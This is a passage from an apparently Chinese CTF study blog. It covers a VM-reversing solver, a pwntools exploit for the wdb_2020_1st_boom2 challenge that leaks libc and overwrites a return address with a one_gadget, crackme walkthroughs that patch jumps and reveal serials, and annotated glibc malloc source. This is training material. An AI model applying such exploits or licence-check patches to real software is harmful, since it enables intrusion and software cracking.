class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">read</span><br><span class="line">mov eax flag[0]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[32] eax</span><br><span class="line">mov eax flag[1]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[33] eax</span><br><span class="line">mov eax flag[2]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[34] eax</span><br><span class="line">mov eax flag[3]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[35] eax</span><br><span class="line">mov eax flag[4]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[36] eax</span><br><span class="line">mov eax flag[5]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[37] eax</span><br><span class="line">mov eax flag[6]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[38] eax</span><br><span class="line">mov eax flag[7]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[39] eax</span><br><span class="line">mov eax flag[8]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[40] eax</span><br><span class="line">mov eax flag[9]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[41] eax</span><br><span class="line">mov eax flag[10]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[42] eax</span><br><span class="line">mov eax flag[11]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[43] eax</span><br><span class="line">mov eax flag[12]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[44] eax</span><br><span class="line">mov eax flag[13]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[45] eax</span><br><span class="line">mov eax flag[14]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[46] eax</span><br><span class="line">mov eax flag[15]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[47] eax</span><br><span class="line">mov eax flag[16]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[48] eax</span><br><span class="line">mov eax flag[17]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[49] eax</span><br><span class="line">mov eax flag[18]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[50] eax</span><br><span class="line">mov eax flag[19]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[51] eax</span><br><span class="line">nop</span><br><span class="line">#上面部分是误解</span><br><span class="line">read</span><br><span class="line"></span><br><span class="line">mov eax flag[0]</span><br><span class="line">mov ebx flag[1]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[0] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[1]</span><br><span class="line">mov ebx flag[2]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[1] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[2]</span><br><span class="line">mov ebx flag[3]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[2] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[3]</span><br><span class="line">mov ebx flag[4]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[3] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[4]</span><br><span class="line">mov ebx flag[5]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[4] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[5]</span><br><span class="line">mov ebx flag[6]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[5] eax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov eax flag[6]</span><br><span class="line">mov ebx flag[7]</span><br><span class="line">mov ecx flag[8]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[6] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[7]</span><br><span class="line">mov ebx flag[8]</span><br><span class="line">mov ecx flag[9]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[7] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[8]</span><br><span class="line">mov ebx flag[9]</span><br><span class="line">mov ecx flag[10]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[8] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[13]</span><br><span class="line">mov ebx flag[19]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[13] eax</span><br><span class="line">mov flag[19] ebx</span><br><span class="line"></span><br><span class="line">mov eax flag[14]</span><br><span class="line">mov ebx flag[18]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[14] eax</span><br><span class="line">mov flag[18] ebx</span><br><span class="line"></span><br><span class="line">mov eax flag[15]</span><br><span class="line">mov ebx flag[17]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[15] eax</span><br><span class="line">mov flag[17] ebx</span><br><span class="line">nop</span><br></pre></td></tr></table></figure><p>从读入长度以及0x2020a8引用判断下面部分才是真正的逆向块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_F00</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; dword_2022A4 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)qword_2022A8 + i) != byte_202020[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正的加密逻辑:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span>    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)：:</span><br><span class="line">    flag[i] = flag[i]^flag[i + <span class="number">1</span>]</span><br><span class="line">flag[<span class="number">6</span>] = (flag[<span class="number">8</span>]+<span class="number">2</span>*flag[<span class="number">7</span>]+<span class="number">3</span>*flag[<span class="number">6</span>])*flag[<span class="number">12</span>]</span><br><span class="line">flag[<span class="number">7</span>] = (flag[<span class="number">9</span>]+<span class="number">2</span>*flag[<span class="number">8</span>]+<span class="number">3</span>*flag[<span class="number">7</span>])*flag[<span class="number">12</span>]</span><br><span class="line">flag[<span class="number">8</span>] = (flag[<span class="number">10</span>]+<span class="number">2</span>*flag[<span class="number">9</span>]+<span class="number">3</span>*flag[<span class="number">8</span>])*flag[<span class="number">12</span>]</span><br><span class="line">swap(flag[<span class="number">13</span>], flag[<span class="number">19</span>])</span><br><span class="line">swap(flag[<span class="number">14</span>], flag[<span class="number">18</span>])</span><br><span class="line">swap(flag[<span class="number">15</span>], flag[<span class="number">17</span>])</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">check = [<span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0xC5</span>, <span class="number">0x0B</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>,</span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x5F</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>]</span><br><span class="line"></span><br><span class="line">check[<span class="number">13</span>], check[<span class="number">19</span>] = check[<span class="number">19</span>], check[<span class="number">13</span>]</span><br><span class="line">check[<span class="number">14</span>], check[<span class="number">18</span>] = check[<span class="number">18</span>], check[<span class="number">14</span>]</span><br><span class="line">check[<span class="number">15</span>], check[<span class="number">17</span>] = check[<span class="number">17</span>], check[<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span> check[<span class="number">8</span>] == ((i*<span class="number">3</span> + check[<span class="number">9</span>]*<span class="number">2</span> + check[<span class="number">10</span>])*check[<span class="number">12</span>])&amp;<span class="number">0xff</span>:</span><br><span class="line">        check[<span class="number">8</span>] = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span> check[<span class="number">7</span>] == ((j * <span class="number">3</span> + check[<span class="number">8</span>] * <span class="number">2</span> + check[<span class="number">9</span>]) * check[<span class="number">12</span>]) &amp; <span class="number">0xff</span>:</span><br><span class="line">                check[<span class="number">7</span>] = j</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">                    <span class="keyword">if</span> check[<span class="number">6</span>] == ((k * <span class="number">3</span> + check[<span class="number">7</span>] * <span class="number">2</span> + check[<span class="number">8</span>]) * check[<span class="number">12</span>]) &amp; <span class="number">0xff</span>:</span><br><span class="line">                        check[<span class="number">6</span>] = k</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)[::-<span class="number">1</span>]:</span><br><span class="line">    check[i] ^= check[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(check)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(check[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="wdb-2020-1st-boom2"><a href="#wdb-2020-1st-boom2" class="headerlink" title="wdb_2020_1st_boom2"></a>wdb_2020_1st_boom2</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/boom&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ida打开发现存在类似平坦化混淆的东西</p><p>不过影响不大</p><p>申请了两个0x40000得堆块分别用作栈和数据缓冲区,并且初始化栈:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1        30</span><br><span class="line">2        13</span><br><span class="line">3        0</span><br><span class="line">4        真实栈地址</span><br><span class="line">5        虚拟栈地址</span><br></pre></td></tr></table></figure><p>vm题比较麻烦的点就是分析指令,以及确定各内存如何对应模拟环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0 immcode: reg=[sp+immcode]</span><br><span class="line">1 immcode: reg=immcode</span><br><span class="line">6 immcode: push bp; bp=sp; sp-=immcode</span><br><span class="line">8 immcode: leave; ret</span><br><span class="line">9        : reg=[reg]</span><br><span class="line">10       : reg=char([reg])</span><br><span class="line">11       : [sp]=reg(int64)</span><br><span class="line">12       : [sp]=reg(byte)</span><br><span class="line">13       : push reg</span><br><span class="line">14       : [sp]=[sp] | reg</span><br><span class="line">15       : [sp]=[sp] ^ reg</span><br><span class="line">16       : [sp]=[sp] &amp; reg</span><br><span class="line">17       : [sp]=[sp] == reg</span><br><span class="line">18       : [sp]=[sp] != reg</span><br><span class="line">19       : [sp]=[sp] &lt; reg</span><br><span class="line">20       : [sp]=[sp] &gt; reg</span><br><span class="line">21       : [sp]=[sp] &lt;= reg</span><br><span class="line">22       : [sp]=[sp] &gt;= reg</span><br><span class="line">23       : [sp]=[sp] &lt;&lt; reg</span><br><span class="line">24       : [sp]=[sp] &gt;&gt; reg</span><br><span class="line">25       : [sp]=[sp] + reg</span><br><span class="line">26       : [sp]=[sp] - reg</span><br><span class="line">27       : [sp]=[sp] * reg</span><br><span class="line">28       : [sp]=[sp] / reg</span><br><span class="line">29       : [sp]=[sp] % reg</span><br><span class="line">30       : exit</span><br></pre></td></tr></table></figure><p>因为栈中存储有真实的栈地址,所以我们可以利用它来覆盖返回地址</p><p><strong>步骤:</strong></p><ol><li>首先进行一次pop将初始栈顶的bp pop出来,随便一个改变栈的指令就行</li><li>这时栈顶就是真实栈指针了，然后利用指令1将reg寄存器置为便宜0xe8，然后利用指令26，让栈指针减0xe8，并利用指令13将结果重新入栈</li><li>使用指令9取值，获取返回地址处的值（也就是libc_start_main+231的地址），并用13指令将获取到的值入栈</li><li>利用指令1将reg置为libc_start_main+231的偏移值offset，然后利用指令26让libc_start_main+231地址减偏移，得到libc的基址，并用13指令将获取到的libc基址入栈</li><li>利用指令1将reg置为onegadget的偏移offset，然后利用指令25计算出libc基址加onegadget偏移，也就是onegadget的地址</li><li>这时栈顶是之前步骤2入栈的返回地址指针，利用指令11将onegadget写入覆盖返回地址</li><li>然后直接发送即可。</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc231=基址偏移</span><br><span class="line">onegadget=可用one_gadget</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">14</span>)  <span class="comment">#步骤1</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(<span class="number">0xe8</span>)+p64(<span class="number">26</span>)+p64(<span class="number">13</span>) <span class="comment">#步骤2</span></span><br><span class="line">payload+=p64(<span class="number">9</span>)+p64(<span class="number">13</span>)   <span class="comment">#步骤3</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(libc231)+p64(<span class="number">26</span>)+p64(<span class="number">13</span>) <span class="comment">#步骤4</span></span><br><span class="line"><span class="comment">#现在      stack    返回地址所在的栈</span></span><br><span class="line"><span class="comment">#                   libc基址</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(onegadget)+p64(<span class="number">25</span>) <span class="comment">#步骤5   reg=one_gadget</span></span><br><span class="line">payload+=p64(<span class="number">11</span>) <span class="comment">#步骤6</span></span><br><span class="line">p.send(payload) <span class="comment">#步骤7</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="任务Ⅲ"><a href="#任务Ⅲ" class="headerlink" title="任务Ⅲ"></a>任务Ⅲ</h1><h2 id="blaster"><a href="#blaster" class="headerlink" title="blaster"></a>blaster</h2><p>无壳直接od打开</p><p>要求去除开始的nag窗口</p><p>老办法先找字符串</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-08-09_174318.png" alt=""></p><p>向上找到函数开始,直接函数开始进行retn去除nag窗口</p><p>又发现一串明文’2G83G35Hs2’</p><p>填入发现就是注册码</p><p>又或者跟随字符串Danke, das Passwort ist richtig !</p><p>进入函数</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-08-09_175128.png" alt=""></p><p>上面只有一个je跳转,下断点调试发现在这里是跳转实现的,因此将其nop爆破</p><h2 id="bjanes-1"><a href="#bjanes-1" class="headerlink" title="bjanes.1"></a>bjanes.1</h2><p>无壳od打开</p><p>跟随成功字符串,跳转到唯一成功jg下断点</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-08-09_184133.png" alt=""></p><p>点击check it发现没有运行到断点直接显示错误信息</p><p>向上找到</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-08-09_183915.png" alt=""></p><p>发现长度一定要为9</p><p>将jg修改为jle跳转成功</p><h2 id="badboy"><a href="#badboy" class="headerlink" title="badboy"></a>badboy</h2><p>待补😗</p><h2 id="Andrnalin"><a href="#Andrnalin" class="headerlink" title="Andrnalin"></a>Andrnalin</h2><p>无壳打开,跟踪字符串</p><p>只是爆破的话,找到最靠近的跳转,下断点发现停住了,nop即可<br><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-08-09_192456.png" alt=""></p><p>同时发现遗一串奇怪的明文’SynTaX 2oo1’</p><p>发现就是注册码</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SunmerCamp2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc-free实现变化</title>
      <link href="/posts/61238/"/>
      <url>/posts/61238/</url>
      
        <content type="html"><![CDATA[<span class='p '>第二篇</span><h1 id="glibc2-23"><a href="#glibc2-23" class="headerlink" title="glibc2.23"></a>glibc2.23</h1><p>还是先以2.23为基础</p><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>大多写在注释,重要的另写</p><h3 id="fastbin-FILO"><a href="#fastbin-FILO" class="headerlink" title="fastbin(FILO)"></a>fastbin(FILO)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index (nb); <span class="comment">//计算出索引</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">//获得单链表头节点</span></span><br><span class="line">    mchunkptr pp = *fb;<span class="comment">//获得第一个chunk</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">           != victim);</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">//检查</span></span><br><span class="line">          &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">          errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//chunk2mem转换地址</span></span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;<span class="comment">//返回</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="smallbin-FIFO"><a href="#smallbin-FIFO" class="headerlink" title="smallbin(FIFO)"></a>smallbin(FIFO)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);<span class="comment">//计算索引</span></span><br><span class="line">     bin = bin_at (av, idx);<span class="comment">//初始化链表头</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)<span class="comment">//检测链为空</span></span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">               &#125;</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);<span class="comment">//设置下一个chunk的p位</span></span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;<span class="comment">//设置A位</span></span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;<span class="comment">//返回</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="largebin-FIFO"><a href="#largebin-FIFO" class="headerlink" title="largebin(FIFO)"></a>largebin(FIFO)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到,申请largebin时,并不会直接进入largebin中寻找,而是会:</p><ol><li>判断是否有fastchunk,是则触发malloc_consolidate (av);</li><li>进入unsortedbin遍历循环,找到则返回</li><li>进入largebin分配</li></ol><h3 id="unsortedbin-FIFO-遍历"><a href="#unsortedbin-FIFO-遍历" class="headerlink" title="unsortedbin(FIFO)遍历"></a>unsortedbin(FIFO)遍历</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 